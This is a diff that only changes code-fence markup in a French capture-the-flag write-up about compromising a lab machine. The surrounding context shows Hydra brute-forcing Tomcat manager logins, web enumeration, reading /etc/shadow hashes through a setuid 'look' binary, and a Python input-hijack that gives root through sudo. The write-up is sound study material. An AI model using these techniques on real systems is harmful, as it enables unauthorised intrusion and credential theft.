@@ -10,7 +10,7 @@ Convertisseur de rouille
 
 Comme le nom du CTF l'indique il y en a un autre avant mais il n'y a aucune obligation à les faire dans l'ordre :)  
 
-```plain
+```
 Nmap scan report for 192.168.56.12
 Host is up (0.00020s latency).
 Not shown: 65532 closed tcp ports (reset)
@@ -36,7 +36,7 @@ Passons au serveur Tomcat. Une fois sur le site on suit le lien *manager* à l'a
 
 Peut être que l'Hydre de THC pourra nous sauver ? FuzzDB a la liste des users / passwords les plus courants pour du Tomcat.  
 
-```plain
+```
 $ ./hydra -L /fuzzdb/wordlists-user-passwd/tomcat/tomcat_mgr_default_users.txt -P /fuzzdb/wordlists-user-passwd/tomcat/tomcat_mgr_default_pass.txt http-get://192.168.56.12:8080/manager/html
 Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -52,7 +52,7 @@ Tentons l'énumération web sur le Tomcat au cas où. C'est amusant d'utiliser u
 
 Je tente d'énumérer les scripts JSP et archives WAR vu que l'on est sur du Tomcat ainsi que les fichiers textes au cas où.  
 
-```plain
+```
 $ feroxbuster -u http://192.168.56.12:8080/ -w /fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-words.txt -x jsp,txt,war -n
 
  ___  ___  __   __     __      __         __   ___
@@ -94,7 +94,7 @@ Il est question de password donc le fichier doit être protégé par un mot de p
 
 Une énumération sur la racine du Tomcat permet de retrouver un fichier *backup.zip* :  
 
-```plain
+```
 unzip -l backup.zip 
 Archive:  backup.zip
   Length      Date    Time    Name
@@ -146,14 +146,14 @@ Let's take a look
 
 Un coup de [ReverseSSH](https://github.com/Fahrj/reverse-ssh) (mon nouveau meilleur ami) plus tard je fouille dans ce système qui a deux utilisateurs non privilégiés.  
 
-```plain
+```
 randy:x:1000:1000:randy,,,:/home/randy:/bin/bash
 jaye:x:1002:1002::/home/jaye:/bin/sh
 ```
 
 Je peux zieuter dans le dossier de *Randy* :  
 
-```plain
+```
 drwxr-xr-x 2 randy randy 4096 Sep 16 17:23 Desktop
 drwxr-xr-x 2 randy randy 4096 Sep 16 17:23 Documents
 drwxr-xr-x 2 randy randy 4096 Sep 16 17:23 Downloads
@@ -200,7 +200,7 @@ A ce stade, rien à un tirer. Le fichier *note.txt* contient le texte suivant :
 
 Effectivement :  
 
-```plain
+```
 tomcat@corrosion:/home/randy$ ls -ld .
 dr-xr-xr-x 15 randy randy 4096 Sep 20 19:57 .
 ```
@@ -211,13 +211,13 @@ Il s'avère que ce dernier a le même mot de passe que pour Tomcat, on peut *su*
 
 Cet utilisateur a un exécutable *setuid* dans son dossier *Files* :
 
-```plain
+```
 ---s--s--x  1 root root 14728 Sep 17 20:53 look
 ```
 
 On ne dispose pas d'accès en lecture sur le fichier pour l'étudier dans les détails mais à l'exécution il sonne plus comme un binaire GNU classique :  
 
-```plain
+```
 $ ./look
 usage: look [-bdf] [-t char] string [file ...]
 ```
@@ -226,14 +226,14 @@ J'ai en effet retrouvé [une manpage correspondant à cette version](https://www
 
 Pour faire court cet utilitaire permet d'extraire d'un fichier texte toutes les lignes commençant par un pattern donné.  
 
-```plain
+```
 $ ./look root /etc/shadow
 root:$6$fHvHhNo5DWsYxgt0$.3upyGTbu9RjpoCkHfW.1F9mq5dxjwcqeZl0KnwEr0vXXzi7Tld2lAeYeIio/9BFPjUCyaBeLgVH1yK.5OR57.:18888:0:99999:7:::
 ```
 
 Et avec *randy* :  
 
-```plain
+```
 randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:18888:0:99999:7:::
 ```
 
@@ -250,7 +250,7 @@ for c in string.printable:
 
 On peut obtenir le flag final mais ça laisse un goût d'inachevé (rien de mieux qu'un shell) :  
 
-```plain
+```
 $ python3 /tmp/test.py /root/root.txt
 2fdbf8d4f894292361d6c72c8e833a4b
 ```
@@ -314,7 +314,7 @@ def input(s):
 __builtins__["input"] = input
 ```
 
-```plain
+```
 randy@corrosion:~$ sudo /usr/bin/python3.8 /home/randy/randombase64.py
 Enter your string: id
 uid=0(root) gid=0(root) groups=0(root)
